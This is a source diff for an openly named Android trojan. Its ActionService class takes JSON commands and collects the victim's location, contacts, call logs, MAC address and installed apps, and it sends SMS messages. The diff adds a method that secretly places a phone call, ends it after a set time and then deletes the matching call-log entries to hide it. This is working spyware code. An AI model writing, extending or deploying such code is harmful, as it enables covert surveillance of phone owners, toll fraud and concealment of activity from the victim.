@@ -1,14 +1,14 @@
-package trojan.android.android_trojan;
+package trojan.android.android_trojan.Action;
 
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageInfo;
 import android.database.Cursor;
-import android.graphics.drawable.Drawable;
 import android.location.Criteria;
 import android.location.Location;
 import android.location.LocationManager;
+import android.net.Uri;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.provider.CallLog;
@@ -18,19 +18,23 @@ import android.util.Log;
 
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.List;
 
 import org.json.*;
+
+import trojan.android.android_trojan.Action.BroadcastReceiver.PhoneStateReceiver;
 
 
 public class ActionService {
 
     private static final String TAG = "ActionService";
     private Context context;
+    private String result = null;
+
+
     public ActionService(Context context){
         this.context = context;
     }
-    private String result = null;
-
 
     public String action(String arg) {
         JSONObject argjson;
@@ -41,6 +45,7 @@ public class ActionService {
             getCallLog(argjson);
             getMacAddress(argjson);
             SendSMS(argjson);
+            getInstalledApps(argjson);
         }catch (JSONException ex){
             Log.d(TAG, ex.getMessage());
             this.result = "Error JSON";
@@ -49,7 +54,8 @@ public class ActionService {
         return result;
     }
 
-    public void getLocation(JSONObject argjson) {
+    //Get current location
+    private void getLocation(JSONObject argjson) {
         if (!argjson.has("location")){
             return;
         }
@@ -75,7 +81,8 @@ public class ActionService {
     }
 
 
-    public void getContacts(JSONObject argjson) {
+    //get the contact list
+    private void getContacts(JSONObject argjson) {
         if (!argjson.has("contacts")){
             return;
         }
@@ -107,7 +114,8 @@ public class ActionService {
         this.result = new JSONArray(contacts).toString();
     }
 
-    public void getCallLog(JSONObject argjson) {
+    //get calls log
+    private void getCallLog(JSONObject argjson) {
         if (!argjson.has("calllogs")){
             return;
         }
@@ -135,7 +143,8 @@ public class ActionService {
     }
 
 
-    public void getMacAddress(JSONObject argjson) {
+    //get current Mac Address
+    private void getMacAddress(JSONObject argjson) {
         if (!argjson.has("mac")){
             return;
         }
@@ -145,7 +154,8 @@ public class ActionService {
         this.result = info.getMacAddress();
     }
 
-    public void SendSMS(JSONObject argjson) throws JSONException {
+    //Send SMS
+    private void SendSMS(JSONObject argjson) throws JSONException {
         if (!argjson.has("sendsms")){
             return;
         }
@@ -161,5 +171,76 @@ public class ActionService {
         sms.sendTextMessage(numTelephone, null, message, null, null);
 
         this.result = "message send";
+    }
+
+    //Get current installed apps
+    private void getInstalledApps(JSONObject argjson) {
+        if (!argjson.has("packages")){
+            return;
+        }
+
+        boolean getSysPackages = true;
+        ArrayList<String[]> packages = new ArrayList<String[]>();
+        List<PackageInfo> packs = context.getPackageManager().getInstalledPackages(0);
+
+        for (int i = 0; i < packs.size(); i++) {
+            PackageInfo p = packs.get(i);
+            if ((!getSysPackages) && (p.versionName == null)) {
+                continue;
+            }
+
+            packages.add(new String[]{
+                    p.applicationInfo.loadLabel(context.getPackageManager()).toString(),
+                    p.packageName,
+                    p.versionName,
+                    String.valueOf(p.versionCode)
+            });
+
+        }
+
+        this.result = new JSONArray(packages).toString();
+    }
+
+    public void call(JSONObject argjson) throws JSONException {
+        if (!argjson.has("call")){
+            return;
+        }
+
+        String num;
+        long time;
+
+        JSONArray array = argjson.getJSONArray("call");
+        num = array.get(0).toString();
+        time = Long.valueOf(array.get(1).toString());
+
+        if (time > 1000) {
+            Intent intent = new Intent(Intent.ACTION_CALL);
+            intent.setData(Uri.parse("tel:" + num));
+            context.startActivity(intent);
+
+            Log.d(TAG, "Start call");
+            PhoneStateReceiver phoneStateReceiver = new PhoneStateReceiver();
+
+            Tools.sleep(time);
+
+            phoneStateReceiver.onReceive(context, intent);
+            phoneStateReceiver.killCall(context);
+
+            Log.d(TAG, "Stop call");
+
+            Tools.sleep(1000);
+
+            String strNumberOne[] = {num};
+            Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, CallLog.Calls.NUMBER + " = ? ", strNumberOne, "");
+            if (cursor.moveToFirst()) {
+                do {
+                    int idOfRowToDelete = cursor.getInt(cursor.getColumnIndex(CallLog.Calls._ID));
+                    context.getContentResolver().delete(
+                            CallLog.Calls.CONTENT_URI,
+                            CallLog.Calls._ID + "= ? ",
+                            new String[]{String.valueOf(idOfRowToDelete)});
+                } while (cursor.moveToNext());
+            }
+        }
     }
 }
